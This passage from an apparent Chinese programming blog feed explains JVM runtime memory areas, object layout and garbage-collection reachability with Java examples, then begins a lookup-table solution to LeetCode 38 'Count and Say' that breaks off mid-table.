<p>Java虚拟机通过索引定位的方式使用局部变量表，索引值的范围是从0开始至局部变量表最大的变量槽数量。如果访问的是32位数据类型的变量，索引N就代表了使用第N个变量槽，如果访问的是64位的书库类型的变量，则说明会同时使用第N和N+1两个变量槽。对于两个相邻的共同存放一个64位数据的两个变量槽，虚拟机不允许采用任何方式单独访问其中某一个，《Java虚拟机规范》中明确要求了如果遇到进行这种操作的字节码序列，虚拟机就应该在类加载校验阶段中抛出异常。</p>
<p>当一个方法被调用时，Java虚拟机会使用局部变量表来完成参数值到参数列表的传递过程，即实参到形参的传递。如果执行的是实例方法（没有被static修饰的方法），那么，局部变量表中第0位索引的变量槽默认是用于传递方法所属对象实例的引用，在方法中可以通过关键字this来访问到这个隐含的参数。其余参数则按照参数表顺序排列，占用从1开始的局部变量槽，参数表分配完毕后，再根据方法体内部定义的变量顺序和作用域分配其余的变量槽。</p>
<h4 id="操作数栈"><a href="#操作数栈" class="headerlink" title="操作数栈"></a>操作数栈</h4><p>操作数栈是一个后入先出栈，它的最大深度也在编译的时候被写入到Code属性的max_stacks数据项之中。操作数栈的每一个元素都可以是包括long和double在内的任意Java数据类型。32位数据类型所占的栈容量为1，64位数据类型所占的栈容量为2.</p>
<h4 id="动态连接"><a href="#动态连接" class="headerlink" title="动态连接"></a>动态连接</h4><p>每个栈帧都包含一个指向运行时常量池中该栈帧所属方法的引用，持有这个引用是为了支持方法调用过程中的动态连接。</p>
<h4 id="方法返回地址"><a href="#方法返回地址" class="headerlink" title="方法返回地址"></a>方法返回地址</h4><p>当一个方法开始执行后，只有两种方式退出这个方法。第一种方式是执行引擎遇到任意一个方法返回的字节码指令，这时候可能会有返回值传递给上层的方法调用者（调用当前方法的方法称为调用者或者主调方法），方法是否有返回值以及返回值的类型将根据遇到何种方法返回指令来决定，这种退出方法的方式称为“正常调用完成”。</p>
<p>另外一种退出方式是在方法执行的过程中遇到了异常，并且这个异常没有在方法体内得到妥善处理。无论是Java虚拟机内部产生的异常，还是代码中使用athrow字节码指令产生的异常，只要在本方法的异常表中没有搜索到匹配的异常处理器，就会导致方法退出。</p>
<p>无论采取何种退出方式，在方法退出之后，都必须返回到最初方法被调用时的位置，程序才能继续执行。方法返回时可能需要在栈帧中保存一些信息，用来帮助恢复它的上层主调方法的执行状态。一般来说，方法正常退出时，主调方法的PC计数器的值就可以作为返回地址，栈帧中很可能会保存这个计数器值。而方法异常退出时，返回地址是要通过异常处理器表来确定的，栈帧中就一般不会保存这部分信息。</p>
<h4 id="附加信息"><a href="#附加信息" class="headerlink" title="附加信息"></a>附加信息</h4><p>《Java虚拟机规范》允许虚拟机实现增加一些规范里没有描述的信息到栈帧之中，例如与调试、性能收集相关的信息，这部分信息完全取决于具体的虚拟机实现。</p>
<h2 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h2><p>本地方法栈与虚拟机栈所发挥的作用是非常相似的，其区别只是虚拟机栈为虚拟机执行Java方法服务，二本地方法栈则是为虚拟机使用到的本地方法服务。</p>
<h2 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h2><p>方法区和 <code>Java</code>堆一样，为多个线程共享，它用于存储<strong>类信息</strong>、<strong>常量</strong>、<strong>静态常量</strong>和<strong>即时编译后的代码</strong>等数据。</p>
<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p><code>Java</code>堆是被所有<strong>线程共享</strong>的<strong>最大</strong>的一块内存区域，在虚拟机启动时创建。此内存区域的唯一目的就是<strong>存放对象实例</strong>，几乎所有的对象实例都在这里分配内存。</p>
<h2 id="运行时常量池"><a href="#运行时常量池" class="headerlink" title="运行时常量池"></a>运行时常量池</h2><p>运行时常量池（Runtime Constant Pool）是方法区的一部分。Class文件中除了有类的版本、字段、方法、接口等描述信息外，还有一项信息是常量池表（Constant Pool table），用于存放编译期生成的各种字面量与符号引用，这部分内容将在类加载后存放到方法去的运行时常量池中。</p>
<h2 id="直接内存"><a href="#直接内存" class="headerlink" title="直接内存"></a>直接内存</h2><p>直接内存（Direct Memory）并不是虚拟机运行时数据区的一部分，也不是《Java虚拟机规范》中定义的内存区域。在JDK1.4中新加入了NIO（New Input/Output)类，引入了一种基于通道（Channel）与缓冲区（Buffer）的I/o方式，它可以使用Native函数库直接分配对外内存，然后通过一个存储在Java堆里面的DitectByteBuffer对象作为这块内存的引用进行操作。</p>
<h1 id="HotSpot虚拟机对象"><a href="#HotSpot虚拟机对象" class="headerlink" title="HotSpot虚拟机对象"></a>HotSpot虚拟机对象</h1><h2 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h2><p>对象创建大致可参考如下流程图：</p>
<p><img src="https://huhansi.github.io/images/2020-03-31-new-java-object-flow.png" alt="对象创建简略流程"></p>
<h2 id="对象内存布局"><a href="#对象内存布局" class="headerlink" title="对象内存布局"></a>对象内存布局</h2><p>在HotSpot虚拟机里，对象在对没存中的存储布局可以划分为三个部分：对象头、实例数据和对齐填充。</p>
<p>HotSpot虚拟机对象的对象头部分包括两类信息。</p>
<p>第一类适用于存储对象自身运行时的数据，如哈希码、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等。</p>
<p>对象头的另外一部分是类型指针，即对象指向它的类型元数据的指针，Java虚拟机通过这个指针来确定该对象是哪个类的实例。</p>
<p>如果对象是一个Java数组，那在对象头中还必须有一块用于记录数组长度的数据。</p>
<table>
<thead>
<tr>
<th>存储内容</th>
<th>标志位</th>
<th>状态</th>
</tr>
</thead>
<tbody><tr>
<td>对象哈希码、对象分代年龄</td>
<td>01</td>
<td>未锁定</td>
</tr>
<tr>
<td>指向所记录的指针</td>
<td>00</td>
<td>轻量级锁定</td>
</tr>
<tr>
<td>指向重量级锁的指针</td>
<td>10</td>
<td>膨胀（重量级锁定）</td>
</tr>
<tr>
<td>空，不需要记录信息</td>
<td>11</td>
<td>GC标记</td>
</tr>
<tr>
<td>偏向线程ID、偏向时间戳、对象分代年龄</td>
<td>01</td>
<td>可偏向</td>
</tr>
</tbody></table>
<h2 id="对象的访问定位"><a href="#对象的访问定位" class="headerlink" title="对象的访问定位"></a>对象的访问定位</h2><p>《Java虚拟机规范》规定了，通过栈上的reference指针去操作堆上的具体对象，但没有定义这个引用应该通过什么方式去定位、访问到堆中对象的具体位置，所以对象访问方式也是由虚拟机实现而定，主流的访问方式主要有使用句柄和直接指针两种：</p>
<ul>
<li>如果使用句柄访问的话，Java堆中将可能会划分出一块内存来作为句柄池，reference中存储的就是对象的句柄地址，而句柄中包含了对象实例数据与类型数据各自具体的地址信息。</li>
</ul>
<p><img src="https://huhansi.github.io/images/2020-03-31-jubingdingwei.png" alt="通过句柄访问"></p>
<ul>
<li>如果使用直接指针访问的话，Java堆中对象的内存布局就必须考虑如何放置访问类型数据的相关新消息，reference中存储的直接就是对象地址，如果只是访问对象本身的话，就不需要多一次间接访问的开销。</li>
</ul>
<p><img src="https://huhansi.github.io/images/2020-03-31-zhijiezhizhen.png" alt="通过直接指针访问"></p>
<p>这两中对象访问方式各有优势，使用句柄来访问的最大好处就是reference中存储的是稳定句柄地址，在对象被移动（垃圾回收）时只会改变句柄中的实例数据指针，而reference本身不需要被修改。</p>
<p>使用直接直接指针来访问最大的好处就是速度更快，它节省了一次指针定位的时间开销。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href>深入理解Java虚拟机</a></p>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
        <tag>内存区域</tag>
      </tags>
  </entry>
  <entry>
    <title>如何判断对象是否可以回收</title>
    <url>/2020/03/28/Java/JVM/2020-03-28-Java-%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E5%AF%B9%E8%B1%A1%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%E5%9B%9E%E6%94%B6/</url>
    <content><![CDATA[<h1 id="如何判断Java对象是否可以回收"><a href="#如何判断Java对象是否可以回收" class="headerlink" title="如何判断Java对象是否可以回收"></a>如何判断Java对象是否可以回收</h1><p>Java中垃圾回收是负责税收已经消亡或者是不再使用的对象，那么如何判断对象是否可以回收呢？</p>
<p>主流的方法有两种：<strong>引用计数</strong>和<strong>可达性分析</strong></p>
<h2 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h2><p>引用计数的算法流程是这样的：在对象中添加一个引用计数器，一旦有一个新的引用指向这个对象，它的计数器值就加一；当引用失效或者指向别处时，计数器数值就减一；当这个计数器的值为零时，就代表着这个对象可以回收了。</p>
<p>Python语言就是用的这个方法来判断对象是否可以回收的。</p>
<p>但是，这个方法有一个比较致命的缺点，就是它解决不了循环引用的问题。</p>
<p>看下面这个代码片段</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	Test test;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTest</span><span class="params">(Test other)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.test = other;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Test t1 = <span class="keyword">new</span> Test();</span><br><span class="line">		Test t2 = <span class="keyword">new</span> Test();</span><br><span class="line">		</span><br><span class="line">		t1.setTest(t2);</span><br><span class="line">		t2.setTest(t1);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对象t1指向了t2，对象t2又指向了t1。这样就会导致他们的引用计数都是1.就算后面这两个对象没有在使用，因为它们互相引用的关系，它们是不会被垃圾回收的。就会造成内存泄露问题。</p>
<h2 id="可达性分析算法"><a href="#可达性分析算法" class="headerlink" title="可达性分析算法"></a>可达性分析算法</h2><p>可达性分析算法的基本思想是：通过一些列被称为“GC Roots”的根对象，作为起始节点集，从这些节点开始，根据引用对象向下搜索，搜索过程所走过的路径称为”引用链“，如果某个对象到GC Roots间没有任何引用链相连，或者用图论的话说就是从GC Roots到这个对象不可达时，则证明此对象是不可能再被使用的。</p>
<p>如下图</p>
<p><img src="https://huhansi.github.io/images/2020-04-03-gc-roots.jpg" alt="可达性分析-标记对象"></p>
<p>在上图中，ObE和ObjD就是不可达的对象，它们可以直接被回收掉。</p>
<p>在Java技术体系里面，固定可作为GC Roots的对象包括以下几种：</p>
<ul>
<li>在虚拟机栈（栈帧中的本地变量表）中引用的对象，譬如各个线程被调用的方法堆栈中使用到的参数、局部变量、临时变量等</li>
<li>在方法区中类静态属性引用的对象，譬如Java类的引用类型静态变量</li>
<li>在方法区中常量引用的对象，譬如字符串常量池里的引用</li>
<li>在本地方法栈JNI（即通常所说的Native方法）引用的对象</li>
<li>Java虚拟机内部的引用，如基本熟路类型对应的Class对象，一些常驻的异常对象（比如NullPointException、OutOfMemoryErrot）等，还有系统类加载器。</li>
<li>所有被同步锁（synchronized关键字）持有的对象</li>
<li>反应Java虚拟机内部情况的JMXBean。JVMTI中注册的回调、本地代码缓存等。</li>
</ul>
<h3 id="对象被标记回收之后，如何逃过垃圾回收"><a href="#对象被标记回收之后，如何逃过垃圾回收" class="headerlink" title="对象被标记回收之后，如何逃过垃圾回收"></a>对象被标记回收之后，如何逃过垃圾回收</h3><p>即使在可达性分析算法中判定为不可达的对象，也不是“非死不可”的。要真正宣告一个对象死亡，至少要经历两次标记过程：如果对象在进行可达性分析后发现没有与GC Roots相连接的引用链，那么它将会被第一次标记，随后进行一次筛选，筛选的条件时此对象是否有必要执行finalize()方法。加入对象没有覆盖finalize()方法，或者finalize()方法已经被虚拟机调用过，那么虚拟机将这两种情况都视为“没有必要执行”。</p>
<p>如果这个对象被判定为确有必要执行finalize()方法，那么该对象将会被放置在一个名为F-Queue的队列之中，并在稍后由一条虚拟机自动建立的、低调度优先级的Finalizer线程去执行它们的finalize()方法。</p>
<p>但是，这里虚拟机会触发执行finalize()方法，但是不承诺会等这个方法执行结束。因为存在某个对象的finalize()方法执行缓慢，或者陷入死循环导致其他对象一直处于等待状态。</p>
<p>finalize()方法是对象逃脱死亡命运的最后一次机会，稍后收集器将对F-Queue中的对象进行第二次小规模的标记，如果对象要在finalize()中成功拯救自己——只要冲印与引用链上的任何一个对象建立关联即可。譬如，把自己（this关键字）赋值给某个类变量或者对象的成员变脸，那么在第二次标记时它将被移出“即将回收”的集合；如果这个对象这时候还没有逃脱，那基本上他就真的要被回收了。</p>
<p>以下面这个代码段为例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Test SAVE_HOOK = <span class="keyword">null</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">isAlive</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"yes, i am alive"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">super</span>.finalize();</span><br><span class="line">		</span><br><span class="line">		System.out.println(<span class="string">"finalize method execute"</span>);</span><br><span class="line">		<span class="comment">// 将SAVE_HOOK重新链上存活对象</span></span><br><span class="line">		SAVE_HOOK = <span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		<span class="comment">// 初始化 SAVE_HOOK</span></span><br><span class="line">		SAVE_HOOK = <span class="keyword">new</span> Test();</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 将SAVE_HOOK设置为null，以便可以垃圾回收</span></span><br><span class="line">		SAVE_HOOK = <span class="keyword">null</span>;</span><br><span class="line">		<span class="comment">// 触发垃圾回收</span></span><br><span class="line">		System.gc();</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 暂停，因为finalizer线程优先级低</span></span><br><span class="line">		Thread.sleep(<span class="number">500</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> != SAVE_HOOK) &#123;</span><br><span class="line">			SAVE_HOOK.isAlive();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			System.out.println(<span class="string">"No i am dead."</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 同上面一样的代码，但是因为finalize方法只执行一次</span></span><br><span class="line">		SAVE_HOOK = <span class="keyword">null</span>;</span><br><span class="line">		System.gc();</span><br><span class="line">		Thread.sleep(<span class="number">500</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> != SAVE_HOOK) &#123;</span><br><span class="line">			SAVE_HOOK.isAlive();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			System.out.println(<span class="string">"No i am dead."</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果</p>
<p><img src="https://huhansi.github.io/images/2020-04-03-finalize.png" alt="对象逃脱垃圾回收"></p>
<h2 id="回收方法区"><a href="#回收方法区" class="headerlink" title="回收方法区"></a>回收方法区</h2><p>方法区的垃圾回收主要回收两部分内容：废弃的常量和不再使用的类型。</p>
<p>没有任何一个对象引用某个常量的话，该常量就可以被回收了。</p>
<p>而判定一个类型是否属于“不再使用的类”的条件就比较苛刻了。需要同时满足下面三个条件：</p>
<ol>
<li>该类所有的实例都已经被回收，也就是Java堆中不存在该类及其任何派生子类的实例。</li>
<li>加载该类的类加载器已经被回收</li>
<li>该类对应的java.lang.Class对象没有在任何地方被引用，无法在任何地方通过反射访问该类的方法</li>
</ol>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[深入理解Java虚拟机]</p>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
        <tag>回收</tag>
      </tags>
  </entry>
  <entry>
    <title>38. 外观数列</title>
    <url>/2020/03/27/LeetCode/leetcode-000038-%E5%A4%96%E8%A7%82%E6%95%B0%E5%88%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>「外观数列」是一个整数序列，从数字 1 开始，序列中的每一项都是对前一项的描述。前五项如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.     <span class="number">1</span></span><br><span class="line"><span class="number">2</span>.     <span class="number">11</span></span><br><span class="line"><span class="number">3</span>.     <span class="number">21</span></span><br><span class="line"><span class="number">4</span>.     <span class="number">1211</span></span><br><span class="line"><span class="number">5</span>.     <span class="number">111221</span></span><br></pre></td></tr></table></figure>

<p>1 被读作  “one 1”  (“一个一”) , 即 11。<br>11 被读作 “two 1s” (“两个一”）, 即 21。<br>21 被读作 “one 2”,  “one 1” （”一个二” ,  “一个一”) , 即 1211。</p>
<p>给定一个正整数 n（1 ≤ n ≤ 30），输出外观数列的第 n 项。</p>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>整数序列中的每一项将表示为一个字符串。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">1</span></span><br><span class="line">输出: <span class="string">"1"</span></span><br><span class="line">解释：这是一个基本样例。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">4</span></span><br><span class="line">输出: <span class="string">"1211"</span></span><br><span class="line">解释：当 n = <span class="number">3</span> 时，序列是 <span class="string">"21"</span>，其中我们有 <span class="string">"2"</span> 和 <span class="string">"1"</span> 两组，<span class="string">"2"</span> 可以读作 <span class="string">"12"</span>，也就是出现频次 = <span class="number">1</span> 而 值 = <span class="number">2</span>；类似 <span class="string">"1"</span> 可以读作 <span class="string">"11"</span>。所以答案是 <span class="string">"12"</span> 和 <span class="string">"11"</span> 组合在一起，也就是 <span class="string">"1211"</span>。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：打表"><a href="#解法一：打表" class="headerlink" title="解法一：打表"></a>解法一：打表</h3><p>因为n最大只到30，所以可以直接求出所有符合条件的答案，根据n返回对应的字符串即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">countAndSay</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">switch</span> (n) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"11"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"21"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"1211"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"111221"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"312211"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"13112221"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"1113213211"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"31131211131221"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"13211311123113112211"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"11131221133112132113212221"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"3113112221232112111312211312113211"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"1321132132111213122112311311222113111221131221"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"11131221131211131231121113112221121321132132211331222113112211"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"311311222113111231131112132112311321322112111312211312111322212311322113212221"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"132113213221133112132113311211131221121321131211132221123113112221131112311332111213211322211312113211"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"11131221131211132221232112111312212321123113112221121113122113111231133221121321132132211331121321231231121113122113322113111221131221"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"31131122211311123113321112131221123113112211121312211213211321322112311311222113311213212322211211131221131211132221232112111312111213111213211231131122212322211331222113112211"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">19</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"1321132132211331121321231231121113112221121321132122311211131122211211131221131211132221121321132132212321121113121112133221123113112221131112311332111213122112311311123112111331121113122112132113213211121332212311322113212221"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"11131221131211132221232112111312111213111213211231132132211211131221131211221321123113213221123113112221131112311332211211131221131211132211121312211231131112311211232221121321132132211331121321231231121113112221121321133112132112312321123113112221121113122113121113123112112322111213211322211312113211"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"311311222113111231133211121312211231131112311211133112111312211213211312111322211231131122211311122122111312211213211312111322211213211321322113311213212322211231131122211311123113223112111311222112132113311213211221121332211211131221131211132221232112111312111213111213211231132132211211131221232112111312211213111213122112132113213221123113112221131112311311121321122112132231121113122113322113111221131221"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">22</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"132113213221133112132123123112111311222112132113311213211231232112311311222112111312211311123113322112132113213221133122112231131122211211131221131112311332211211131221131211132221232112111312111213322112132113213221133112132113221321123113213221121113122123211211131221222112112322211231131122211311123113321112131221123113111231121113311211131221121321131211132221123113112211121312211231131122211211133112111311222112111312211312111322211213211321322113311213211331121113122122211211132213211231131122212322211331222113112211"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">23</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"111312211312111322212321121113121112131112132112311321322112111312212321121113122112131112131221121321132132211231131122211331121321232221121113122113121113222123112221221321132132211231131122211331121321232221123113112221131112311332111213122112311311123112112322211211131221131211132221232112111312211322111312211213211312111322211231131122111213122112311311221132211221121332211213211321322113311213212312311211131122211213211331121321123123211231131122211211131221131112311332211213211321223112111311222112132113213221123123211231132132211231131122211311123113322112111312211312111322212321121113122123211231131122113221123113221113122112132113213211121332212311322113212221"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"3113112221131112311332111213122112311311123112111331121113122112132113121113222112311311221112131221123113112221121113311211131122211211131221131211132221121321132132212321121113121112133221123113112221131112311332111213213211221113122113121113222112132113213221232112111312111213322112132113213221133112132123123112111311222112132113311213211221121332211231131122211311123113321112131221123113112221132231131122211211131221131112311332211213211321223112111311222112132113212221132221222112112322211211131221131211132221232112111312111213111213211231132132211211131221232112111312211213111213122112132113213221123113112221133112132123222112111312211312112213211231132132211211131221131211132221121311121312211213211312111322211213211321322113311213212322211231131122211311123113321112131221123113112211121312211213211321222113222112132113223113112221121113122113121113123112112322111213211322211312113211"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"132113213221133112132123123112111311222112132113311213211231232112311311222112111312211311123113322112132113212231121113112221121321132132211231232112311321322112311311222113111231133221121113122113121113221112131221123113111231121123222112132113213221133112132123123112111312111312212231131122211311123113322112111312211312111322111213122112311311123112112322211211131221131211132221232112111312111213111213211231132132211211131221232112111312212221121123222112132113213221133112132123123112111311222112132113213221132213211321322112311311222113311213212322211211131221131211221321123113213221121113122113121132211332113221122112133221123113112221131112311332111213122112311311123112111331121113122112132113121113222112311311221112131221123113112221121113311211131122211211131221131211132221121321132132212321121113121112133221123113112221131112212211131221121321131211132221123113112221131112311332211211133112111311222112111312211311123113322112111312211312111322212321121113121112133221121321132132211331121321231231121113112221121321132122311211131122211211131221131211322113322112111312211322132113213221123113112221131112311311121321122112132231121113122113322113111221131221"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">26</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"1113122113121113222123211211131211121311121321123113213221121113122123211211131221121311121312211213211321322112311311222113311213212322211211131221131211221321123113213221121113122113121113222112131112131221121321131211132221121321132132211331121321232221123113112221131112311322311211131122211213211331121321122112133221121113122113121113222123211211131211121311121321123113111231131122112213211321322113311213212322211231131122211311123113223112111311222112132113311213211221121332211231131122211311123113321112131221123113111231121113311211131221121321131211132221123113112211121312211231131122113221122112133221121113122113121113222123211211131211121311121321123113213221121113122113121113222113221113122113121113222112132113213221232112111312111213322112311311222113111221221113122112132113121113222112311311222113111221132221231221132221222112112322211213211321322113311213212312311211131122211213211331121321123123211231131122211211131221131112311332211213211321223112111311222112132113213221123123211231132132211231131122211311123113322112111312211312111322111213122112311311123112112322211213211321322113312211223113112221121113122113111231133221121321132132211331121321232221123123211231132132211231131122211331121321232221123113112221131112311332111213122112311311123112112322211211131221131211132221232112111312111213111213211231132132211211131221131211221321123113213221123113112221131112211322212322211231131122211322111312211312111322211213211321322113311213211331121113122122211211132213211231131122212322211331222113112211"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">27</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"31131122211311123113321112131221123113111231121113311211131221121321131211132221123113112211121312211231131122211211133112111311222112111312211312111322211213211321322123211211131211121332211231131122211311122122111312211213211312111322211231131122211311123113322112111331121113112221121113122113111231133221121113122113121113222123211211131211121332211213211321322113311213211322132112311321322112111312212321121113122122211211232221123113112221131112311332111213122112311311123112111331121113122112132113311213211321222122111312211312111322212321121113121112133221121321132132211331121321132213211231132132211211131221232112111312212221121123222112132113213221133112132123123112111311222112132113311213211231232112311311222112111312211311123113322112132113212231121113112221121321132122211322212221121123222112311311222113111231133211121312211231131112311211133112111312211213211312111322211231131122211311123113322113223113112221131112311332211211131221131211132211121312211231131112311211232221121321132132211331221122311311222112111312211311123113322112132113213221133122211332111213112221133211322112211213322112111312211312111322212321121113121112131112132112311321322112111312212321121113122112131112131221121321132132211231131122211331121321232221121113122113121122132112311321322112111312211312111322211213111213122112132113121113222112132113213221133112132123222112311311222113111231132231121113112221121321133112132112211213322112111312211312111322212311222122132113213221123113112221133112132123222112111312211312111322212321121113121112133221121311121312211213211312111322211213211321322123211211131211121332211213211321322113311213212312311211131122211213211331121321122112133221123113112221131112311332111213122112311311123112111331121113122112132113121113222112311311222113111221221113122112132113121113222112132113213221133122211332111213322112132113213221132231131122211311123113322112111312211312111322212321121113122123211231131122113221123113221113122112132113213211121332212311322113212221"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">28</span>:</span><br><span class="line">			<span class="keyword">return</span> <span 